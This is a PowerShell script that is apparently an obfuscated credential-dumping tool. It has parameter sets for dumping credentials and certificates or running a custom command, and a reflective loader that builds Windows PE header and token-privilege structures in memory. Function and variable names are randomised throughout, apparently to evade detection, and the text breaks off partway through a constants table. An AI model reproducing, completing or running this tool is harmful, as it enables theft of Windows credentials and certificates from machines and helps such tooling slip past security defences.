function honeydew
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $ixChYeXp99,
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $cTVYmMGD99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $GavgUezh99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$lZzZZVGP99 = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $ByznnlSm99,
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $vQbBuDkG99,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $BmSZVLVh99,
                
        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $VIKrIEhk99,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $QJdJIgvP99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ZfBwWbof99
    )
    
    Function Canberra
    {
        $EdirUAaY99 = New-Object System.Object
        $zBWaDWMt99 = [AppDomain]::CurrentDomain
        $nvtwDDpX99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $PLzrHAcM99 = $zBWaDWMt99.DefineDynamicAssembly($nvtwDDpX99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $PVnZQIQf99 = $PLzrHAcM99.DefineDynamicModule('DynamicModule', $false)
        $wNDKhvLo99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $tZbjmwnm99 = $PVnZQIQf99.DefineEnum('MachineType', 'Public', [UInt16])
        $tZbjmwnm99.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $tZbjmwnm99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $tZbjmwnm99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $tZbjmwnm99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $vIrAfOwm99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $vIrAfOwm99
        $tZbjmwnm99 = $PVnZQIQf99.DefineEnum('MagicType', 'Public', [UInt16])
        $tZbjmwnm99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $tVIpHqXl99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $tVIpHqXl99
        $tZbjmwnm99 = $PVnZQIQf99.DefineEnum('SubSystemType', 'Public', [UInt16])
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $MkVIaQPW99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $MkVIaQPW99
        $tZbjmwnm99 = $PVnZQIQf99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $tZbjmwnm99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $tZbjmwnm99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $tZbjmwnm99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $tZbjmwnm99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $tZbjmwnm99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $tZbjmwnm99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $TZldFRds99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $TZldFRds99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_DATA_DIRECTORY', $zsGeqRlk99, [System.ValueType], 8)
        ($tZbjmwnm99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($tZbjmwnm99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $YshunIPm99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $YshunIPm99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_FILE_HEADER', $zsGeqRlk99, [System.ValueType], 20)
        $tZbjmwnm99.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $VVjdPqaa99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $VVjdPqaa99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_OPTIONAL_HEADER64', $zsGeqRlk99, [System.ValueType], 240)
        ($tZbjmwnm99.DefineField('Magic', $tVIpHqXl99, 'Public')).SetOffset(0) | Out-Null
        ($tZbjmwnm99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($tZbjmwnm99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($tZbjmwnm99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($tZbjmwnm99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($tZbjmwnm99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($tZbjmwnm99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($tZbjmwnm99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($tZbjmwnm99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($tZbjmwnm99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($tZbjmwnm99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($tZbjmwnm99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($tZbjmwnm99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($tZbjmwnm99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($tZbjmwnm99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($tZbjmwnm99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($tZbjmwnm99.DefineField('Subsystem', $MkVIaQPW99, 'Public')).SetOffset(68) | Out-Null
        ($tZbjmwnm99.DefineField('DllCharacteristics', $TZldFRds99, 'Public')).SetOffset(70) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($tZbjmwnm99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($tZbjmwnm99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($tZbjmwnm99.DefineField('ExportTable', $YshunIPm99, 'Public')).SetOffset(112) | Out-Null
        ($tZbjmwnm99.DefineField('ImportTable', $YshunIPm99, 'Public')).SetOffset(120) | Out-Null
        ($tZbjmwnm99.DefineField('ResourceTable', $YshunIPm99, 'Public')).SetOffset(128) | Out-Null
        ($tZbjmwnm99.DefineField('ExceptionTable', $YshunIPm99, 'Public')).SetOffset(136) | Out-Null
        ($tZbjmwnm99.DefineField('CertificateTable', $YshunIPm99, 'Public')).SetOffset(144) | Out-Null
        ($tZbjmwnm99.DefineField('BaseRelocationTable', $YshunIPm99, 'Public')).SetOffset(152) | Out-Null
        ($tZbjmwnm99.DefineField('Debug', $YshunIPm99, 'Public')).SetOffset(160) | Out-Null
        ($tZbjmwnm99.DefineField('Architecture', $YshunIPm99, 'Public')).SetOffset(168) | Out-Null
        ($tZbjmwnm99.DefineField('GlobalPtr', $YshunIPm99, 'Public')).SetOffset(176) | Out-Null
        ($tZbjmwnm99.DefineField('TLSTable', $YshunIPm99, 'Public')).SetOffset(184) | Out-Null
        ($tZbjmwnm99.DefineField('LoadConfigTable', $YshunIPm99, 'Public')).SetOffset(192) | Out-Null
        ($tZbjmwnm99.DefineField('BoundImport', $YshunIPm99, 'Public')).SetOffset(200) | Out-Null
        ($tZbjmwnm99.DefineField('IAT', $YshunIPm99, 'Public')).SetOffset(208) | Out-Null
        ($tZbjmwnm99.DefineField('DelayImportDescriptor', $YshunIPm99, 'Public')).SetOffset(216) | Out-Null
        ($tZbjmwnm99.DefineField('CLRRuntimeHeader', $YshunIPm99, 'Public')).SetOffset(224) | Out-Null
        ($tZbjmwnm99.DefineField('Reserved', $YshunIPm99, 'Public')).SetOffset(232) | Out-Null
        $clrIqCMD99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $clrIqCMD99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_OPTIONAL_HEADER32', $zsGeqRlk99, [System.ValueType], 224)
        ($tZbjmwnm99.DefineField('Magic', $tVIpHqXl99, 'Public')).SetOffset(0) | Out-Null
        ($tZbjmwnm99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($tZbjmwnm99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($tZbjmwnm99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($tZbjmwnm99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($tZbjmwnm99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($tZbjmwnm99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($tZbjmwnm99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($tZbjmwnm99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($tZbjmwnm99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($tZbjmwnm99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($tZbjmwnm99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($tZbjmwnm99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($tZbjmwnm99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($tZbjmwnm99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($tZbjmwnm99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($tZbjmwnm99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($tZbjmwnm99.DefineField('Subsystem', $MkVIaQPW99, 'Public')).SetOffset(68) | Out-Null
        ($tZbjmwnm99.DefineField('DllCharacteristics', $TZldFRds99, 'Public')).SetOffset(70) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($tZbjmwnm99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($tZbjmwnm99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($tZbjmwnm99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($tZbjmwnm99.DefineField('ExportTable', $YshunIPm99, 'Public')).SetOffset(96) | Out-Null
        ($tZbjmwnm99.DefineField('ImportTable', $YshunIPm99, 'Public')).SetOffset(104) | Out-Null
        ($tZbjmwnm99.DefineField('ResourceTable', $YshunIPm99, 'Public')).SetOffset(112) | Out-Null
        ($tZbjmwnm99.DefineField('ExceptionTable', $YshunIPm99, 'Public')).SetOffset(120) | Out-Null
        ($tZbjmwnm99.DefineField('CertificateTable', $YshunIPm99, 'Public')).SetOffset(128) | Out-Null
        ($tZbjmwnm99.DefineField('BaseRelocationTable', $YshunIPm99, 'Public')).SetOffset(136) | Out-Null
        ($tZbjmwnm99.DefineField('Debug', $YshunIPm99, 'Public')).SetOffset(144) | Out-Null
        ($tZbjmwnm99.DefineField('Architecture', $YshunIPm99, 'Public')).SetOffset(152) | Out-Null
        ($tZbjmwnm99.DefineField('GlobalPtr', $YshunIPm99, 'Public')).SetOffset(160) | Out-Null
        ($tZbjmwnm99.DefineField('TLSTable', $YshunIPm99, 'Public')).SetOffset(168) | Out-Null
        ($tZbjmwnm99.DefineField('LoadConfigTable', $YshunIPm99, 'Public')).SetOffset(176) | Out-Null
        ($tZbjmwnm99.DefineField('BoundImport', $YshunIPm99, 'Public')).SetOffset(184) | Out-Null
        ($tZbjmwnm99.DefineField('IAT', $YshunIPm99, 'Public')).SetOffset(192) | Out-Null
        ($tZbjmwnm99.DefineField('DelayImportDescriptor', $YshunIPm99, 'Public')).SetOffset(200) | Out-Null
        ($tZbjmwnm99.DefineField('CLRRuntimeHeader', $YshunIPm99, 'Public')).SetOffset(208) | Out-Null
        ($tZbjmwnm99.DefineField('Reserved', $YshunIPm99, 'Public')).SetOffset(216) | Out-Null
        $dMVNeYow99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $dMVNeYow99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_NT_HEADERS64', $zsGeqRlk99, [System.ValueType], 264)
        $tZbjmwnm99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('FileHeader', $VVjdPqaa99, 'Public') | Out-Null
        $tZbjmwnm99.DefineField('OptionalHeader', $clrIqCMD99, 'Public') | Out-Null
        $egXnpVqR99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $egXnpVqR99
        
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_NT_HEADERS32', $zsGeqRlk99, [System.ValueType], 248)
        $tZbjmwnm99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('FileHeader', $VVjdPqaa99, 'Public') | Out-Null
        $tZbjmwnm99.DefineField('OptionalHeader', $dMVNeYow99, 'Public') | Out-Null
        $eFOFUkQy99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $eFOFUkQy99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_DOS_HEADER', $zsGeqRlk99, [System.ValueType], 64)
        $tZbjmwnm99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
        $dCjbqKKb99 = $tZbjmwnm99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ppViMIwU99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $CxzmnXEB99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $aTuIbBoy99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($wNDKhvLo99, $ppViMIwU99, $CxzmnXEB99, @([Int32] 4))
        $dCjbqKKb99.SetCustomAttribute($aTuIbBoy99)
        $tZbjmwnm99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
        $mxnvDISw99 = $tZbjmwnm99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ppViMIwU99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $aTuIbBoy99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($wNDKhvLo99, $ppViMIwU99, $CxzmnXEB99, @([Int32] 10))
        $mxnvDISw99.SetCustomAttribute($aTuIbBoy99)
        $tZbjmwnm99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $UNnMkjyw99 = $tZbjmwnm99.CreateType()   
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $UNnMkjyw99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_SECTION_HEADER', $zsGeqRlk99, [System.ValueType], 40)
        $EbkWvGtL99 = $tZbjmwnm99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ppViMIwU99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $aTuIbBoy99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($wNDKhvLo99, $ppViMIwU99, $CxzmnXEB99, @([Int32] 8))
        $EbkWvGtL99.SetCustomAttribute($aTuIbBoy99)
        $tZbjmwnm99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $xaqXsaRc99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $xaqXsaRc99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_BASE_RELOCATION', $zsGeqRlk99, [System.ValueType], 8)
        $tZbjmwnm99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $pvJKAHbm99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $pvJKAHbm99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $zsGeqRlk99, [System.ValueType], 20)
        $tZbjmwnm99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $VncsDScL99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $VncsDScL99
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('IMAGE_EXPORT_DIRECTORY', $zsGeqRlk99, [System.ValueType], 40)
        $tZbjmwnm99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('Base', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $gtGHvRVL99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $gtGHvRVL99
        
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('LUID', $zsGeqRlk99, [System.ValueType], 8)
        $tZbjmwnm99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('LUID_AND_ATTRIBUTES', $zsGeqRlk99, [System.ValueType], 12)
        $tZbjmwnm99.DefineField('Luid', $LUID, 'Public') | Out-Null
        $tZbjmwnm99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $DZTQhwgk99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $DZTQhwgk99
        
        $zsGeqRlk99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('TOKEN_PRIVILEGES', $zsGeqRlk99, [System.ValueType], 16)
        $tZbjmwnm99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $tZbjmwnm99.DefineField('Privileges', $DZTQhwgk99, 'Public') | Out-Null
        $lGSZltqs99 = $tZbjmwnm99.CreateType()
        $EdirUAaY99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $lGSZltqs99
        return $EdirUAaY99
    }
    Function Thursdays
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
